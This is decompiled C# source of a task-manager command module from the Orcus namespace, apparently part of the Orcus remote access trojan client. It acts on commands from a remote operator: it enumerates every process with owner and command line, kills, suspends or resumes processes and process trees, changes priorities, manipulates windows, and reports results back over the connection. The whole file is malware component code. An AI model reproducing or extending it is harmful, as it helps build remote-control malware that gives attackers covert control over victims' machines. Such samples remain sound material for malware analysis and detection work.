using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Security.Principal;
using System.Text;
using Orcus.Native;
using Orcus.Plugins;
using Orcus.Shared.Commands.TaskManager;
using Orcus.Shared.NetSerializer;
using Orcus.Utilities;

namespace Orcus.Commands.TaskManager;

internal class TaskmanagerCommand : Command
{
	private const uint WM_CLOSE = 16u;

	public List<int> SendProcesses { get; set; }

	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected I4, but got Unknown
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ff: Expected O, but got Unknown
		//IL_01e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0203: Expected O, but got Unknown
		//IL_020d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0214: Expected O, but got Unknown
		//IL_02b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02bf: Expected O, but got Unknown
		TaskManagerCommunication val = (TaskManagerCommunication)parameter[0];
		switch ((int)val)
		{
		default:
			throw new ArgumentOutOfRangeException();
		case 0:
		{
			int processId = BitConverter.ToInt32(parameter, 1);
			Process processById2;
			try
			{
				processById2 = Process.GetProcessById(processId);
			}
			catch (ArgumentException)
			{
				List<byte> list4 = new List<byte> { 17 };
				list4.AddRange(Encoding.UTF8.GetBytes("The process does not exist"));
				connectionInfo.CommandResponse((Command)(object)this, list4.ToArray(), (PackageCompression)0);
				break;
			}
			try
			{
				processById2.Kill();
			}
			catch (Exception ex4)
			{
				List<byte> list5 = new List<byte> { 17 };
				list5.AddRange(Encoding.UTF8.GetBytes(ex4.Message));
				connectionInfo.CommandResponse((Command)(object)this, list5.ToArray(), (PackageCompression)0);
				break;
			}
			connectionInfo.CommandResponse((Command)(object)this, new byte[1] { 16 }, (PackageCompression)0);
			break;
		}
		case 1:
		{
			Serializer val2 = new Serializer(typeof(List<ProcessInfo>));
			List<byte> list = new List<byte> { 14 };
			List<ProcessInfo> allProcesses2 = GetAllProcesses();
			list.AddRange(val2.Serialize((object)GetAllProcesses()));
			connectionInfo.CommandResponse((Command)(object)this, list.ToArray(), (PackageCompression)0);
			SendProcesses = allProcesses2.Select((ProcessInfo x) => x.get_Id()).ToList();
			break;
		}
		case 2:
		{
			Process[] allProcesses = Process.GetProcesses();
			List<Process> list6 = allProcesses.ToList();
			foreach (Process item in allProcesses.Where((Process process) => SendProcesses.Any((int x) => x == process.Id)))
			{
				list6.Remove(item);
			}
			List<int> closedProcesses = SendProcesses.Where((int process) => allProcesses.All((Process x) => x.Id != process)).ToList();
			ProcessListChangelog val3 = new ProcessListChangelog();
			val3.set_ClosedProcesses(closedProcesses);
			val3.set_NewProcesses(new List<ProcessInfo>());
			ProcessListChangelog val4 = val3;
			ManagementObjectSearcher val5 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Process");
			try
			{
				ManagementObjectCollection val6 = val5.Get();
				try
				{
					foreach (ManagementObject item2 in ((IEnumerable)val6).Cast<ManagementObject>())
					{
						uint pid = item2.TryGetProperty<uint>("ProcessId");
						Process process2 = list6.FirstOrDefault((Process x) => x.Id == pid);
						if (process2 != null)
						{
							val4.get_NewProcesses().Add(ManagementObjectToProcessInfo(item2, process2));
						}
					}
				}
				finally
				{
					((IDisposable)val6)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val5)?.Dispose();
			}
			Serializer val2 = new Serializer(typeof(ProcessListChangelog));
			List<byte> list7 = new List<byte> { 15 };
			list7.AddRange(val2.Serialize((object)val4));
			connectionInfo.CommandResponse((Command)(object)this, list7.ToArray(), (PackageCompression)0);
			SendProcesses = allProcesses.Select((Process x) => x.Id).ToList();
			break;
		}
		case 3:
		{
			int pid2 = BitConverter.ToInt32(parameter, 1);
			Process processById;
			try
			{
				processById = Process.GetProcessById(pid2);
			}
			catch (ArgumentException)
			{
				List<byte> list2 = new List<byte> { 18 };
				list2.AddRange(Encoding.UTF8.GetBytes("The process does not exist"));
				connectionInfo.CommandResponse((Command)(object)this, list2.ToArray(), (PackageCompression)0);
				break;
			}
			try
			{
				processById.PriorityClass = (ProcessPriorityClass)BitConverter.ToInt32(parameter, 5);
			}
			catch (Exception ex2)
			{
				List<byte> list3 = new List<byte> { 18 };
				list3.AddRange(Encoding.UTF8.GetBytes(ex2.Message));
				connectionInfo.CommandResponse((Command)(object)this, list3.ToArray(), (PackageCompression)0);
				break;
			}
			connectionInfo.CommandResponse((Command)(object)this, new byte[1] { 19 }, (PackageCompression)0);
			break;
		}
		case 4:
		{
			int pid2 = BitConverter.ToInt32(parameter, 1);
			KillProcessAndChildren(pid2);
			((Command)this).ResponseByte((byte)20, connectionInfo);
			break;
		}
		case 5:
			Process.GetProcessById(BitConverter.ToInt32(parameter, 1)).Suspend();
			((Command)this).ResponseByte((byte)21, connectionInfo);
			break;
		case 6:
			Process.GetProcessById(BitConverter.ToInt32(parameter, 1)).Resume();
			((Command)this).ResponseByte((byte)22, connectionInfo);
			break;
		case 7:
		{
			IntPtr hWnd = (IntPtr)BitConverter.ToInt64(parameter, 1);
			if (NativeMethods.IsIconic(hWnd))
			{
				NativeMethods.ShowWindow(hWnd, ShowWindowCommands.Restore);
			}
			bool flag = NativeMethods.SetForegroundWindow(hWnd);
			((Command)this).ResponseByte((byte)(flag ? 12 : 13), connectionInfo);
			break;
		}
		case 8:
		{
			IntPtr hWnd = (IntPtr)BitConverter.ToInt64(parameter, 1);
			bool flag = NativeMethods.ShowWindow(hWnd, ShowWindowCommands.Minimize);
			((Command)this).ResponseByte((byte)(flag ? 12 : 13), connectionInfo);
			break;
		}
		case 9:
		{
			IntPtr hWnd = (IntPtr)BitConverter.ToInt64(parameter, 1);
			bool flag = NativeMethods.ShowWindow(hWnd, ShowWindowCommands.Maximize);
			((Command)this).ResponseByte((byte)(flag ? 12 : 13), connectionInfo);
			break;
		}
		case 10:
		{
			IntPtr hWnd = (IntPtr)BitConverter.ToInt64(parameter, 1);
			bool flag = NativeMethods.SendMessage(hWnd, 16u, IntPtr.Zero, IntPtr.Zero) == IntPtr.Zero;
			((Command)this).ResponseByte((byte)(flag ? 12 : 13), connectionInfo);
			break;
		}
		case 11:
		{
			IntPtr hWnd = (IntPtr)BitConverter.ToInt64(parameter, 1);
			bool flag = NativeMethods.ShowWindow(hWnd, ShowWindowCommands.Restore);
			((Command)this).ResponseByte((byte)(flag ? 12 : 13), connectionInfo);
			break;
		}
		}
	}

	private static List<ProcessInfo> GetAllProcesses()
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_00c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Invalid comparison between Unknown and I4
		List<ProcessInfo> list = new List<ProcessInfo>();
		Process[] processes = Process.GetProcesses();
		ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Process");
		try
		{
			ManagementObjectCollection val2 = val.Get();
			try
			{
				ManagementObjectSearcher val3 = new ManagementObjectSearcher("root\\CIMV2", "SELECT ProcessId FROM Win32_Service");
				try
				{
					ManagementObjectCollection val4 = val3.Get();
					try
					{
						List<uint> list2 = (from ManagementObject x in (IEnumerable)val4
							select (uint)((ManagementBaseObject)x).get_Item("ProcessId")).ToList();
						foreach (ManagementObject item in ((IEnumerable)val2).Cast<ManagementObject>())
						{
							uint pid = item.TryGetProperty<uint>("ProcessId");
							ProcessInfo val5 = ManagementObjectToProcessInfo(item, processes.FirstOrDefault((Process x) => x.Id == pid));
							if ((int)val5.get_Status() != 4 && list2.Contains(pid))
							{
								val5.set_Status((ProcessStatus)3);
							}
							list.Add(val5);
						}
						return list;
					}
					finally
					{
						((IDisposable)val4)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val3)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private static void ApplyProcessInformation(Process process, ProcessInfo processInfo, string filename)
	{
		IntPtr handle;
		try
		{
			handle = process.Handle;
		}
		catch (Exception)
		{
			processInfo.set_CanChangePriorityClass(false);
			return;
		}
		try
		{
			processInfo.set_PriorityClass(process.PriorityClass);
			processInfo.set_CanChangePriorityClass(true);
		}
		catch (Exception)
		{
			processInfo.set_CanChangePriorityClass(false);
		}
		try
		{
			string processOwner = ProcessExtension.GetProcessOwner(handle);
			processInfo.set_ProcessOwner(new SecurityIdentifier(processOwner).Translate(typeof(NTAccount)).ToString());
			if (string.Equals(User.UserIdentity?.User?.Value, processOwner, StringComparison.OrdinalIgnoreCase))
			{
				processInfo.set_Status((ProcessStatus)1);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(filename);
			processInfo.set_Description(versionInfo.FileDescription);
			processInfo.set_CompanyName(versionInfo.CompanyName);
			processInfo.set_ProductVersion(versionInfo.ProductVersion);
			processInfo.set_FileVersion(versionInfo.FileVersion);
			processInfo.set_IconBytes(FileUtilities.GetIconFromProcess(versionInfo.FileName));
			AssemblyName.GetAssemblyName(filename);
			processInfo.set_Status((ProcessStatus)2);
		}
		catch (Exception)
		{
		}
		Version version = new Version(6, 2, 9200, 0);
		if (Environment.OSVersion.Platform == PlatformID.Win32NT && Environment.OSVersion.Version >= version && NativeMethods.IsImmersiveProcess(handle))
		{
			processInfo.set_Status((ProcessStatus)4);
		}
	}

	private static ProcessInfo ManagementObjectToProcessInfo(ManagementObject queryObj, Process process)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0115: Expected O, but got Unknown
		ProcessInfo val = new ProcessInfo();
		val.set_Name(queryObj.TryGetProperty<string>("Name"));
		val.set_PrivateBytes(process?.PrivateMemorySize64 ?? 0L);
		val.set_WorkingSet((long)queryObj.TryGetProperty<ulong>("WorkingSetSize"));
		val.set_Id((int)queryObj.TryGetProperty<uint>("ProcessId"));
		val.set_ParentProcess((int)queryObj.TryGetProperty<uint>("ParentProcessId"));
		val.set_StartTime((ManagementExtensions.ToDateTimeSafe(queryObj.TryGetProperty<string>("CreationDate")) ?? ExceptionUtilities.EatExceptions(() => process?.StartTime) ?? DateTime.MinValue).ToUniversalTime());
		val.set_Filename(queryObj.TryGetProperty<string>("ExecutablePath"));
		val.set_CommandLine(queryObj.TryGetProperty<string>("CommandLine"));
		val.set_MainWindowHandle((long)(process?.MainWindowHandle ?? IntPtr.Zero));
		ProcessInfo val2 = val;
		ApplyProcessInformation(process, val2, queryObj.TryGetProperty<string>("ExecutablePath"));
		return val2;
	}

	private static void KillProcessAndChildren(int pid)
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("Select * From Win32_Process Where ParentProcessID=" + pid);
		try
		{
			ManagementObjectCollection val2 = val.Get();
			try
			{
				ManagementObjectEnumerator enumerator = val2.GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						KillProcessAndChildren((int)ManagementExtensions.TryGetProperty<uint>((ManagementObject)enumerator.get_Current(), "ProcessID"));
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				try
				{
					Process.GetProcessById(pid).Kill();
				}
				catch (Exception)
				{
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	protected override uint GetId()
	{
		return 16u;
	}
}
